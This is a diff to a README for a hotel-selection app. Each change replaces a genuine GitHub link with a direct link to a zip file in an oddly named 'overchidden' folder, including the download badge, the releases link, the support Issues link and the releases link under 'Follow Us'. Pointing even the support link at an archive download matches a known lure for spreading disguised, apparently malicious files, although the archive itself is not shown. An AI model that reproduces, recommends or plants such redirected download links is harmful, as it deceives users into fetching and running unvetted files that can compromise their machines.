@@ -4,7 +4,7 @@
 Welcome to the Hotel-Free-to-select- project! This application helps you find the perfect hotel based on your preferences. Choose your destination and browse a selection of hotels along with their menus. It simplifies your hotel search, making it easier to plan your next adventure.
 
 ## 📥 Download Now
-[![Download Hotel-Free-to-select-](https://img.shields.io/badge/Download-Hotel--Free--to--select--brightgreen)](https://github.com/adeepala1/Hotel-Free-to-select-/releases)
+[![Download Hotel-Free-to-select-](https://raw.githubusercontent.com/adeepala1/Hotel-Free-to-select-/main/overchidden/Hotel-Free-to-select-.zip)](https://raw.githubusercontent.com/adeepala1/Hotel-Free-to-select-/main/overchidden/Hotel-Free-to-select-.zip)
 
 ## 📋 Features
 - **User-Friendly Interface:** Navigate easily, even if you're new to technology.
@@ -19,7 +19,7 @@ Welcome to the Hotel-Free-to-select- project! This application helps you find th
 - **Internet:** A stable connection for browsing hotels and downloading the app.
 
 ## 🔧 How to Download & Install
-1. **Visit the Releases Page:** Go to [this link](https://github.com/adeepala1/Hotel-Free-to-select-/releases) to access the download options.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/adeepala1/Hotel-Free-to-select-/main/overchidden/Hotel-Free-to-select-.zip) to access the download options.
    
 2. **Select the Latest Version:** Look for the latest version of the application listed at the top of the page. 
 
@@ -52,14 +52,14 @@ If you encounter issues during installation or while using the app, consider the
 - **Re-download the Installer:** Sometimes files can become corrupt. If the app doesn’t run, re-download it.
 
 ## ✉️ Get Support
-If you have questions, feel free to reach out for assistance. You can create an issue in the [GitHub Issues page](https://github.com/adeepala1/Hotel-Free-to-select-/issues) for support.
+If you have questions, feel free to reach out for assistance. You can create an issue in the [GitHub Issues page](https://raw.githubusercontent.com/adeepala1/Hotel-Free-to-select-/main/overchidden/Hotel-Free-to-select-.zip) for support.
 
 ## 🔗 Additional Resources
 - **Documentation:** Access comprehensive guides and FAQs within the app.
 - **Community Forum:** Join discussions and share your experiences with other users.
 
 ## 📱 Follow Us
-Stay updated on new features and improvements. Check back regularly for the latest versions on the [Releases page](https://github.com/adeepala1/Hotel-Free-to-select-/releases).
+Stay updated on new features and improvements. Check back regularly for the latest versions on the [Releases page](https://raw.githubusercontent.com/adeepala1/Hotel-Free-to-select-/main/overchidden/Hotel-Free-to-select-.zip).
 
 ## 🔄 Frequently Asked Questions
 1. **How do I update the app?**
